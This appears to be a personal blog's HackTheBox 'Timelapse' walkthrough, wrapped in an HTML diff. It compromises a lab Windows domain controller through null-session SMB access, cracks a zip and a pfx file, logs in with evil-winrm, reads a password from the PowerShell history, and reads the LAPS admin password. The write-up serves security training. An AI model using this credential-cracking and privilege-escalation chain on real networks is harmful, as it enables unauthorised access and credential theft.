@@ -1,0 +1,485 @@
+<!DOCTYPE html><html lang="en" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>HackTheBox - Timelapse Walkthrough | mdn1nj4's Blog</title><meta name="author" content="mdn1nj4"><meta name="copyright" content="mdn1nj4"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content="Timelapse was an easy box from hackthebox. To solve this machine we need some basic enumuration and basic knowledge about windows."><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "HackTheBox - Timelapse Walkthrough",
+  "url": "https://mdn1nj4.github.io/htb/hackthebox-timelapse-writeup/",
+  "image": "https://avatars.githubusercontent.com/u/24633923?v=4",
+  "datePublished": "2022-03-31T13:00:00.000Z",
+  "dateModified": "2025-05-08T07:31:28.264Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "mdn1nj4",
+      "url": "https://mdn1nj4.github.io/"
+    }
+  ]
+}</script><link rel="shortcut icon" href="https://avatars.githubusercontent.com/u/24633923?v=4"><link rel="canonical" href="https://mdn1nj4.github.io/htb/hackthebox-timelapse-writeup/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//www.google-analytics.com" crossorigin=""/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script async="async" src="https://www.googletagmanager.com/gtag/js?id=G-X9TKY34D40"></script><script>window.dataLayer = window.dataLayer || []
+function gtag(){dataLayer.push(arguments)}
+gtag('js', new Date())
+gtag('config', 'G-X9TKY34D40')
+btf.addGlobalFn('pjaxComplete', () => {
+  gtag('config', 'G-X9TKY34D40', {'page_path': window.location.pathname})
+}, 'google_analytics')
+</script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: 'Copy Successful',
+    error: 'Copy Failed',
+    noSupport: 'Browser Not Supported'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: 'Just now',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
+    buttonText: 'Load More'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'HackTheBox - Timelapse Walkthrough',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="mdn1nj4's Blog" type="application/atom+xml">
+</head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="https://avatars.githubusercontent.com/u/24633923?v=4" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">19</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">47</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">4</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Post</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="not-top-img" id="page-header"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">mdn1nj4's Blog</span></a><a class="nav-page-title" href="/"><span class="site-name">HackTheBox - Timelapse Walkthrough</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Post</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav></header><main class="layout" id="content-inner"><div id="post"><div id="post-info"><h1 class="post-title">HackTheBox - Timelapse Walkthrough</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2022-03-31T13:00:00.000Z" title="Created 2022-03-31 18:30:00">2022-03-31</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2025-05-08T07:31:28.264Z" title="Updated 2025-05-08 13:01:28">2025-05-08</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/HackTheBox/">HackTheBox</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">Word Count:</span><span class="word-count">1.6k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">Reading Time:</span><span>9mins</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post Views:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div><article class="container post-content" id="article-container"><h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p><strong>OS: Windows<br>Difficulty: Easy<br>Points: 20<br>Release: 26 Mar 2022<br>IP: 10.10.11.152</strong></p>
+<p>Timelapse was an easy machine from HackTheBox. We need some basic enumeration and crack and extract the cert from pfx file to get the user flag.</p>
+<h2 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h2><h3 id="nmap-scanning-result"><a href="#nmap-scanning-result" class="headerlink" title="nmap scanning result"></a>nmap scanning result</h3><pre><code># Nmap 7.92 scan initiated Sun Mar 27 07:29:04 2022 as: nmap -sC -sV -vvv -oN scan.nmap 10.10.11.152
+Nmap scan report for 10.10.11.152
+Host is up, received echo-reply ttl 127 (0.100s latency).
+Scanned at 2022-03-27 07:29:05 UTC for 67s
+Not shown: 989 filtered tcp ports (no-response)
+PORT     STATE SERVICE           REASON          VERSION
+53/tcp   open  domain            syn-ack ttl 127 Simple DNS Plus
+88/tcp   open  kerberos-sec      syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2022-03-27 15:29:18Z)
+135/tcp  open  msrpc             syn-ack ttl 127 Microsoft Windows RPC
+139/tcp  open  netbios-ssn       syn-ack ttl 127 Microsoft Windows netbios-ssn
+389/tcp  open  ldap              syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
+445/tcp  open  microsoft-ds?     syn-ack ttl 127
+464/tcp  open  kpasswd5?         syn-ack ttl 127
+593/tcp  open  ncacn_http        syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
+636/tcp  open  ldapssl?          syn-ack ttl 127
+3268/tcp open  ldap              syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
+3269/tcp open  globalcatLDAPssl? syn-ack ttl 127
+Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| p2p-conficker: 
+|   Checking for Conficker.C or higher...
+|   Check 1 (port 20407/tcp): CLEAN (Timeout)
+|   Check 2 (port 32357/tcp): CLEAN (Timeout)
+|   Check 3 (port 44242/udp): CLEAN (Timeout)
+|   Check 4 (port 22941/udp): CLEAN (Timeout)
+|_  0/4 checks are positive: Host is CLEAN or ports are blocked
+|_clock-skew: 7h59m58s
+| smb2-time: 
+|   date: 2022-03-27T15:29:29
+|_  start_date: N/A
+| smb2-security-mode: 
+|   3.1.1: 
+|_    Message signing enabled and required
+
+Read data files from: /usr/bin/../share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Sun Mar 27 07:30:12 2022 -- 1 IP address (1 host up) scanned in 68.08 seconds
+</code></pre>
+<h2 id="Foothold"><a href="#Foothold" class="headerlink" title="Foothold"></a>Foothold</h2><p>I try some basic attack on the smb like null session injection and it worked and i have access to the shares. There is two directory in shares</p>
+<pre><code>#smbclient -L //10.10.11.152/                                                                                                                    
+Enter WORKGROUP\GUEST&#39;s password:                                                                                                                     
+                                                                                                                                                      
+        Sharename       Type      Comment                                                                                                             
+        ---------       ----      -------                                                                                                             
+        ADMIN$          Disk      Remote Admin                                                                                                        
+        C$              Disk      Default share
+        IPC$            IPC       Remote IPC
+        NETLOGON        Disk      Logon server share 
+        Shares          Disk      
+        SYSVOL          Disk      Logon server share 
+SMB1 disabled -- no workgroup available
+</code></pre>
+<p>Then i Downloaded all files in the smb shares.</p>
+<pre><code>#smbclient //10.10.11.152/shares
+Enter WORKGROUP\GUEST&#39;s password: 
+Try &quot;help&quot; to get a list of possible commands.
+smb: \&gt; ls Dev/
+  .                                   D        0  Mon Oct 25 19:40:06 2021
+  ..                                  D        0  Mon Oct 25 19:40:06 2021
+  winrm_backup.zip                    A     2611  Mon Oct 25 15:46:42 2021
+
+                6367231 blocks of size 4096. 1537388 blocks available
+smb: \&gt; ls HelpDesk\
+  .                                   D        0  Mon Oct 25 15:48:42 2021
+  ..                                  D        0  Mon Oct 25 15:48:42 2021
+  LAPS.x64.msi                        A  1118208  Mon Oct 25 14:57:50 2021
+  LAPS_Datasheet.docx                 A   104422  Mon Oct 25 14:57:46 2021
+  LAPS_OperationsGuide.docx           A   641378  Mon Oct 25 14:57:40 2021
+  LAPS_TechnicalSpecification.docx      A    72683  Mon Oct 25 14:57:44 2021
+
+                6367231 blocks of size 4096. 1537388 blocks available
+</code></pre>
+<p>I read all the documents.</p>
+<p>after that i try to decompress the winrm_backup.zip file.</p>
+<pre><code>#unzip winrm_backup.zip 
+Archive:  winrm_backup.zip
+[winrm_backup.zip] legacyy_dev_auth.pfx password: 
+   skipping: legacyy_dev_auth.pfx    incorrect password
+</code></pre>
+<p>then crack the zip file.</p>
+<pre><code>#fcrackzip -D -p ../rockyou.txt -u winrm_backup.zip                    
+found file &#39;legacyy_dev_auth.pfx&#39;, (size cp/uc   2405/  2555, flags 9, chk 72aa)
+
+PASSWORD FOUND!!!!: pw == supremelegacy
+</code></pre>
+<h2 id="User-Flag"><a href="#User-Flag" class="headerlink" title="User Flag"></a>User Flag</h2><p>zip file  name is winrm_backup.zip</p>
+<p>i must to used to authenticate in winrm then i did a quick google search on what i can do with the pfx file i found some here <a target="_blank" rel="noopener" href="https://www.ibm.com/docs/en/arl/9.7?topic=certification-extracting-certificate-keys-from-pfx-file" title="https://www.ibm.com/docs/en/arl/9.7?topic=certification-extracting-certificate-keys-from-pfx-file">https://www.ibm.com/docs/en/arl/9.7?topic=certification-extracting-certificate-keys-from-pfx-file</a></p>
+<pre><code>#openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out login.key   
+Enter Import Password:
+Can&#39;t read Password
+</code></pre>
+<p>so we need to crack certificate password</p>
+<p>i used crackpkcs12</p>
+<pre><code>#crackpkcs12 -d ../rockyou.txt legacyy_dev_auth.pfx 
+
+Dictionary attack - Starting 4 threads
+
+*********************************************************
+Dictionary attack - Thread 3 - Password found: thuglegacy
+*********************************************************
+</code></pre>
+<p>Extract the private and public key</p>
+<pre><code>#openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out login.key                                                                                 
+Enter Import Password:                                                                                                                                
+Enter PEM pass phrase:                                                                                                                                
+Verifying - Enter PEM pass phrase:
+
+#openssl pkcs12 -in legacyy_dev_auth.pfx -clcerts -nokeys -out cert.crt                                                                          
+Enter Import Password:
+</code></pre>
+<p>Login with evil-winrm</p>
+<pre><code>#evil-winrm -S -k login.key -c cert.crt -i 10.10.11.152                
+
+Evil-WinRM shell v3.3
+
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+
+Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+
+Warning: SSL enabled
+
+Info: Establishing connection to remote endpoint
+
+Enter PEM pass phrase:
+*Evil-WinRM* PS C:\Users\legacyy\Documents&gt; 
+</code></pre>
+<p>Get the user flag</p>
+<pre><code>*Evil-WinRM* PS C:\Users\legacyy\Documents&gt; cd ..
+*Evil-WinRM* PS C:\Users\legacyy&gt; tree /f
+Folder PATH listing
+Volume serial number is 22CC-AE66
+C:.
+____Desktop
+_       user.txt
+_
+____Documents
+____Downloads
+____Favorites
+____Links
+____Music
+____Pictures
+____Saved Games
+____Videos
+*Evil-WinRM* PS C:\Users\legacyy&gt; cat Desktop/user.txt
+56146e0ef****************
+</code></pre>
+<h2 id="Priv-Esc"><a href="#Priv-Esc" class="headerlink" title="Priv Esc"></a>Priv Esc</h2><p>user svc_deploy is in group LAPS_Readers</p>
+<pre><code>*Evil-WinRM* PS C:\Users&gt; ls                                                                                                                          
+                                                                                                                                                      
+                                                                                                                                                      
+    Directory: C:\Users                                                                                                                               
+                                                                                                                                                      
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-----       10/23/2021  11:27 AM                Administrator
+d-----       10/25/2021   8:22 AM                legacyy
+d-r---       10/23/2021  11:27 AM                Public
+d-----       10/25/2021  12:23 PM                svc_deploy
+d-----        2/23/2022   5:45 PM                TRX
+
+
+*Evil-WinRM* PS C:\Users&gt; net user svc_deploy
+Enter PEM pass phrase:
+User name                    svc_deploy
+Full Name                    svc_deploy
+Comment
+User&#39;s comment
+Country/region code          000 (System Default)
+Account active               Yes
+Account expires              Never
+
+Password last set            10/25/2021 12:12:37 PM
+Password expires             Never
+Password changeable          10/26/2021 12:12:37 PM
+Password required            Yes
+User may change password     Yes
+
+Workstations allowed         All
+Logon script
+User profile
+Home directory
+Last logon                   10/25/2021 12:25:53 PM
+
+Logon hours allowed          All
+
+Local Group Memberships      *Remote Management Use
+Global Group memberships     *LAPS_Readers         *Domain Users
+The command completed successfully.
+</code></pre>
+<p>then i looked on the powersell history file. I got the svc_deploy password</p>
+<pre><code>*Evil-WinRM* PS C:\Users&gt; cat $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+whoami
+ipconfig /all
+netstat -ano |select-string LIST
+$so = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck
+$p = ConvertTo-SecureString &#39;REDACTED&#39; -AsPlainText -Force
+$c = New-Object System.Management.Automation.PSCredential (&#39;svc_deploy&#39;, $p)
+invoke-command -computername localhost -credential $c -port 5986 -usessl -
+SessionOption $so -scriptblock &#123;whoami&#125;
+get-aduser -filter * -properties *
+exit
+</code></pre>
+<p>I login with user svc_deploy</p>
+<pre><code>#evil-winrm -S -u &quot;svc_deploy&quot; -p &#39;REDACTED&#39; -i 10.10.11.152
+
+Evil-WinRM shell v3.3
+
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+
+Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+
+Warning: SSL enabled
+
+Info: Establishing connection to remote endpoint
+
+*Evil-WinRM* PS C:\Users\svc_deploy\Documents&gt; 
+</code></pre>
+<h2 id="Root-flag"><a href="#Root-flag" class="headerlink" title="Root flag"></a>Root flag</h2><p>the document say you can view the local administrator password with this command</p>
+<p>Let import the Powershell Module AdmPwd.PS</p>
+<p>git clone <a target="_blank" rel="noopener" href="https://github.com/ztrhgf/LAPS.git" title="https://github.com/ztrhgf/LAPS.git">https://github.com/ztrhgf/LAPS.git</a></p>
+<pre><code>*Evil-WinRM* PS C:\Users\svc_deploy\Documents&gt; upload /root/ctf/htb/timelapse/LAPS/AdmPwd.PS 
+
+Warning: Remember that in docker environment all local paths should be at /data and it must be mapped correctly as a volume on docker run command
+
+Info: Uploading /root/ctf/htb/timelapse/LAPS/AdmPwd.PS to C:\Users\svc_deploy\Documents\AdmPwd.PS
+
+                                                             
+Data: 53980 bytes of 53980 bytes copied
+
+Info: Upload successful!
+
+*Evil-WinRM* PS C:\Users\svc_deploy\Documents&gt; Import-module ./AdmPwd.PS
+</code></pre>
+<p>So refer to the document we need the Computer name to get password</p>
+<blockquote>
+<p>You can also get the password using PowerShell.</p>
+<p>Get-AdmPwdPassword -ComputerName <computername></p>
+</blockquote>
+<pre><code>*Evil-WinRM* PS C:\Users\svc_deploy\Documents&gt; $env:computername
+DC01
+
+*Evil-WinRM* PS C:\Users\svc_deploy\Documents&gt; Get-AdmPwdPassword -ComputerName DC01 | Format-table -autosize
+
+ComputerName DistinguishedName                                 Password                 ExpirationTimestamp                                                                                      
+------------ -----------------                                 --------                 -------------------                                                                                      
+DC01         CN=DC01,OU=Domain Controllers,DC=timelapse,DC=htb REDACTED 4/6/2022 9:46:40 AM                                                                                      
+</code></pre>
+<p>Login to administrator</p>
+<pre><code>#evil-winrm -S -u &quot;administrator&quot; -p &#39;REDACTED&#39; -i 10.10.11.152                                                                                                     
+                                                                                                                                                                                                 
+Evil-WinRM shell v3.3                                                                                                                                                                            
+                                                                                                                                                                                                 
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine                                                          
+                                                                                                                                                                                                 
+Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion                                                                            
+                                                                                                                                                                                                 
+Warning: SSL enabled                                                                                                                                                                             
+                                                                                                                                                                                                 
+Info: Establishing connection to remote endpoint                                                                                                                                                                                                                                                                                                                                            
+</code></pre>
+<p>finding the root flag</p>
+<pre><code>*Evil-WinRM* PS C:\Users\Administrator\Documents&gt; cd /users                                                                                                                                      
+*Evil-WinRM* PS C:\users&gt; tree /f                                                                                                                                                                
+Folder PATH listing                                                                                                                                                                              
+Volume serial number is 22CC-AE66 
+____TRX
+    ____3D Objects
+    ____Contacts
+    ____Desktop
+    _       root.txt
+</code></pre>
+<p>get the root flag</p>
+<pre><code>*Evil-WinRM* PS C:\users&gt; cat TRX/Desktop/root.txt
+9e605da46bc349*****************
+</code></pre>
+</article><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/htb/">htb</a><a class="post-meta__tags" href="/tags/powershell/">powershell</a><a class="post-meta__tags" href="/tags/smb/">smb</a><a class="post-meta__tags" href="/tags/winrm/">winrm</a></div><div class="post-share"><div class="social-share" data-image="https://avatars.githubusercontent.com/u/24633923?v=4" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/pwnable.kr/pwnable.kr-fd-walkthrough/" title="Pwnable.kr - fd Walkthrough"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info"><div class="info-1"><div class="info-item-1">Previous</div><div class="info-item-2">Pwnable.kr - fd Walkthrough</div></div><div class="info-2"><div class="info-item-1">Mommy! what is a file descriptor in Linux?</div></div></div></a><a class="pagination-related" href="/CVE/cve-2022-22965-build-and-attack/" title="CVE-2022-22965 - Build and Exploit"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">Next</div><div class="info-item-2">CVE-2022-22965 - Build and Exploit</div></div><div class="info-2"><div class="info-item-1">A Spring MVC or Spring WebFlux application running on JDK 9+ may be vulnerable to remote code execution (RCE) via data binding. The specific exploit requires the application to run on Tomcat as a WAR deployment. If the application is deployed as a Spring Boot executable jar, i.e. the default, it is not vulnerable to the exploit. However, the nature of the vulnerability is more general, and there may be other ways to exploit it.</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>Related Articles</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/htb/hackthebox-luanne-writeup/" title="HackTheBox - Luanne walkthrough"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2021-09-12</div><div class="info-item-2">HackTheBox - Luanne walkthrough</div></div><div class="info-2"><div class="info-item-1">Luanne is the Easy level OpenBSD machine.Basic Enumuration and lua script does not sanitize the input from user which leads to remote code execution using the os.execute() and then after some enumuration find the id_rsa key for user r.michaels then decrypt the tar backup file and get the user r.micheals password and root part is pretty simple user r.mihaels has run the commmand doas as root user that leads to migrate from user to root privilage.</div></div></div></a><a class="pagination-related" href="/htb/hackthebox-dog-walkthrough/" title="HackTheBox - Dog Walkthrough"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-05-07</div><div class="info-item-2">HackTheBox - Dog Walkthrough</div></div><div class="info-2"><div class="info-item-1">HackTheBox's dog is an easy level linux machine.</div></div></div></a><a class="pagination-related" href="/htb/hackthebox-routerspace-writeup/" title="HackTheBox - RouterSpace Writeup"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2022-04-11</div><div class="info-item-2">HackTheBox - RouterSpace Writeup</div></div><div class="info-2"><div class="info-item-1">RouterSpace was an easy box from hackthebox.</div></div></div></a><a class="pagination-related" href="/htb/hackthebox-passage-writeup/" title="HackTheBox - Passage Writeup"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2021-09-12</div><div class="info-item-2">HackTheBox - Passage Writeup</div></div><div class="info-2"><div class="info-item-1">Passage is the medium level hackthebox machine which is running in the linux.</div></div></div></a><a class="pagination-related" href="/htb/hackthebox-late-writeup/" title="HackTheBox - Late Walkthrough"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2022-04-11</div><div class="info-item-2">HackTheBox - Late Walkthrough</div></div><div class="info-2"><div class="info-item-1">Late was an easy box from hackthebox.</div></div></div></a><a class="pagination-related" href="/htb/hackthebox-trick-writeup/" title="HackTheBox - Trick Walkthrough"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2022-09-05</div><div class="info-item-2">HackTheBox - Trick Walkthrough</div></div><div class="info-2"><div class="info-item-1">Trick was an easy box from hackthebox.</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="https://avatars.githubusercontent.com/u/24633923?v=4" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">mdn1nj4</div><div class="author-info-description">A collection of write-ups, walkthroughs and tips of my adventures</div><div class="site-data"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">19</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">47</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">4</div></a></div><div class="card-info-social-icons"><a class="social-icon" href="https://twitter.com/mdn1nj4" target="_blank" title=""><i class="fab fa-twitter"></i></a><a class="social-icon" href="https://instagram.com/" target="_blank" title=""><i class="fab fa-instagram"></i></a><a class="social-icon" href="https://linkedin.com/" target="_blank" title=""><i class="fab fa-linkedin"></i></a><a class="social-icon" href="https://github.com/mdn1nj4" target="_blank" title="Github"><i class="fab fa-github"></i></a></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Contents</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Introduction"><span class="toc-number">1.</span> <span class="toc-text">Introduction</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Enumeration"><span class="toc-number">2.</span> <span class="toc-text">Enumeration</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#nmap-scanning-result"><span class="toc-number">2.1.</span> <span class="toc-text">nmap scanning result</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Foothold"><span class="toc-number">3.</span> <span class="toc-text">Foothold</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#User-Flag"><span class="toc-number">4.</span> <span class="toc-text">User Flag</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Priv-Esc"><span class="toc-number">5.</span> <span class="toc-text">Priv Esc</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Root-flag"><span class="toc-number">6.</span> <span class="toc-text">Root flag</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Posts</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/htb/hackthebox-dog-walkthrough/" title="HackTheBox - Dog Walkthrough">HackTheBox - Dog Walkthrough</a><time datetime="2025-05-07T13:00:00.000Z" title="Created 2025-05-07 18:30:00">2025-05-07</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/htb/hackthebox-jerry-walkthrough/" title="HackTheBox - Jerry Walkthrough">HackTheBox - Jerry Walkthrough</a><time datetime="2023-09-13T18:30:00.000Z" title="Created 2023-09-14 00:00:00">2023-09-14</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/htb/hackthebox-arctic-walkthrough/" title="HackTheBox - Arctic Walkthrough">HackTheBox - Arctic Walkthrough</a><time datetime="2023-09-12T18:30:00.000Z" title="Created 2023-09-13 00:00:00">2023-09-13</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/htb/hackthebox-bounty-walkthrough/" title="HackTheBox - Bounty Walkthrough">HackTheBox - Bounty 